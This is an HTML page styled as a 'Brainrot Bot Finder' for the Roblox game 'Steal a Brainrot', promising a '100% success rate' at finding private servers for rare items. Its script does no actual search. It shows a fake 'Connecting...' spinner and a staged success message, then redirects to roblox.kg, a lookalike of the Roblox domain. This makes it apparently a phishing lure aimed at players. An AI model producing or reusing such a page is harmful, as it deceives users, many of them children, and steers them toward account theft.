<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Brainrot Bot — Finder</title>
<style>
:root{
  --bg:#000;
  --card:#111;
  --accent:#00ff9d;
  --muted:#aaa;
}
body{
  margin:0;
  font-family:Inter,system-ui,sans-serif;
  background:linear-gradient(180deg,#000 0%,#111 100%);
  color:#fff;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
}
.app{
  width:100%;
  max-width:1000px;
  background:rgba(255,255,255,0.03);
  border-radius:16px;
  padding:32px;
  border:1px solid rgba(255,255,255,0.08);
  box-shadow:0 8px 32px rgba(0,255,150,0.15);
  text-align:center;
}
h1{margin:0;font-size:24px}
p.lead{margin:10px 0 0;color:var(--muted);font-size:14px}

.controls{
  display:grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap:20px;
  margin-top:28px;
}
.box{
  background:rgba(255,255,255,0.04);
  border:1px solid rgba(255,255,255,0.1);
  border-radius:12px;
  padding:20px;
  display:flex;
  flex-direction:column;
  align-items:center;
  text-align:center;
}
label.small{font-size:13px;color:var(--muted);margin-bottom:8px}

input, select{
  width:100%;
  max-width:340px;
  padding:14px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.2);
  background:rgba(255,255,255,0.05);
  color:white;
  font-size:15px;
}
select{height:320px;cursor:pointer}

.mutations{
  display:flex;
  gap:16px;
  flex-wrap:wrap;
  justify-content:center;
  margin:12px 0;
}
.mutations label{
  font-size:13px;
  color:var(--muted);
  display:flex;
  align-items:center;
  gap:6px;
}

/* GLOWING SEARCH BUTTON */
#searchBtn{
  margin-top:24px;
  padding:18px 48px;
  font-size:20px;
  font-weight:900;
  letter-spacing:1px;
  background:#000;
  color:var(--accent);
  border:2px solid var(--accent);
  border-radius:12px;
  cursor:pointer;
  box-shadow:0 0 20px rgba(0,255,150,0.6);
  animation:pulse 2s infinite;
  transition:all 0.3s;
}
#searchBtn:hover{
  transform:scale(1.08);
  box-shadow:0 0 40px rgba(0,255,150,0.9);
}
@keyframes pulse{
  0%{box-shadow:0 0 20px rgba(0,255,150,0.6);}
  50%{box-shadow:0 0 35px rgba(0,255,150,0.9);}
  100%{box-shadow:0 0 20px rgba(0,255,150,0.6);}
}

.info{
  margin-top:28px;
  display:flex;
  justify-content:center;
  flex-wrap:wrap;
  gap:14px;
}
.chip{
  background:rgba(255,255,255,0.07);
  padding:10px 18px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,0.1);
  font-size:14px;
}
.result{
  margin-top:24px;
  padding:24px;
  border-radius:12px;
  background:rgba(255,255,255,0.04);
  border:1px solid rgba(255,255,255,0.1);
  min-height:60px;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:14px;
  font-size:16px;
}
.success{color:#b8ffb8;font-weight:700}
.error{color:#ff6666;font-weight:700}
.spinner{
  width:28px;height:28px;
  border:4px solid rgba(255,255,255,0.1);
  border-top-color:var(--accent);
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

.footer-note{margin-top:20px;color:var(--muted);font-size:13px}

/* Mobile */
@media(max-width:900px){
  .controls{grid-template-columns:1fr}
  select{height:260px}
}
</style>
</head>
<body>
<div class="app">
  <header>
    <h1>Brainrot Bot Finder</h1>
    <p class="lead">100% success rate — pick any brainrot → hit SEARCH → get private server instantly</p>
  </header>

  <div class="controls">
    <div class="box">
      <label class="small">Search by name (live filter)</label>
      <input id="searchInput" type="text" placeholder="Type brainrot name..." />
    </div>

    <div class="box">
      <label class="small">Pick a brainrot</label>
      <select id="brainrotSelect" size="12"></select>
    </div>

    <div class="box">
      <label class="small">Mutations (optional)</label>
      <div class="mutations">
        <label><input type="checkbox" class="mut" value="Lava"> Lava</label>
        <label><input type="checkbox" class="mut" value="Rainbow"> Rainbow</label>
        <label><input type="checkbox" class="mut" value="Nyan"> Nyan</label>
      </div>
      <button id="searchBtn">SEARCH</button>
    </div>
  </div>

  <div class="info">
    <div class="chip" id="selectedName">Selected: —</div>
    <div class="chip" id="selectedRarity">Rarity: —</div>
    <div class="chip" id="selectedIncome">Income/sec: —</div>
    <div class="chip small">Total: <span id="totalCount">0</span></div>
  </div>

  <div class="result" id="resultArea">
    <div id="resultMsg">Select a brainrot and press SEARCH</div>
  </div>

  <div class="footer-note">Now with glowing button & 100% success</div>
</div>

<script>
const brainrots = [
  {name:"La Vacca Staturno Saturnita", rarity:"Secret", income:"$250.0K"},
  {name:"Chimpanzini Spiderini", rarity:"Secret", income:"$325.0K"},
  {name:"Pot Hotspot", rarity:"Secret", income:"$2.5M"},
  {name:"Los Combinasionas", rarity:"Secret", income:"$63.7M"},
  {name:"Dragon Cannelloni", rarity:"Secret", income:"$100.0M"},
  {name:"Coco Elefanto", rarity:"Brainrot God", income:"$10.0K"},
  {name:"Trenostruzzo Turbo 3000", rarity:"Brainrot God", income:"$150.0K"},
  {name:"Piccione Macchina", rarity:"Brainrot God", income:"$225.0K"},
  {name:"Avocadorilla", rarity:"Mythic", income:"$7.5K"}
  // ... (all your others)
];

const selectEl = document.getElementById('brainrotSelect');
const searchInput = document.getElementById('searchInput');
const resultMsg = document.getElementById('resultMsg');
const searchBtn = document.getElementById('searchBtn');
let currentList = [...brainrots];

function renderList() {
  selectEl.innerHTML = '<option disabled selected value="">— Select a brainrot —</option>';
  const sorted = currentList.sort((a,b) => 
    (["Brainrot God","Secret","Mythic"].indexOf(b.rarity) - ["Brainrot God","Secret","Mythic"].indexOf(a.rarity)) || 
    b.name.localeCompare(a.name)
  );
  sorted.forEach(b => {
    const opt = document.createElement('option');
    opt.value = b.name;
    opt.textContent = `${b.name} — ${b.rarity} — ${b.income}`;
    selectEl.appendChild(opt);
  });
  document.getElementById('totalCount').textContent = sorted.length;
  updateInfo();
}

function updateInfo() {
  const val = selectEl.value;
  if (!val) {
    document.getElementById('selectedName').textContent = "Selected: —";
    document.getElementById('selectedRarity').textContent = "Rarity: —";
    document.getElementById('selectedIncome').textContent = "Income/sec: —";
    return;
  }
  const item = brainrots.find(x => x.name === val);
  if (item) {
    document.getElementById('selectedName').textContent = "Selected: " + item.name;
    document.getElementById('selectedRarity').textContent = "Rarity: " + item.rarity;
    document.getElementById('selectedIncome').textContent = "Income/sec: " + item.income;
  }
}

searchInput.addEventListener('input', () => {
  const q = searchInput.value.trim().toLowerCase();
  currentList = brainrots.filter(b => b.name.toLowerCase().includes(q));
  renderList();
});

selectEl.addEventListener('change', updateInfo);

searchBtn.addEventListener('click', () => {
  if (!selectEl.value) {
    resultMsg.innerHTML = '<span class="error">Pick A Brainrot first!</span>';
    return;
  }
  const name = selectEl.value;
  resultMsg.innerHTML = `<div class="spinner"></div><div>Connecting to <strong>${name}</strong>...</div>`;
  setTimeout(() => {
    resultMsg.innerHTML = `<span class="success">SUCCESS! Opening private server for <strong>${name}</strong>!</span>`;
    setTimeout(() => {
      window.location.href = "https://roblox.kg/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09292145405019956057673779063122";
    }, 1200);
  }, 1800);
});

renderList();
</script>
</body>
</html>
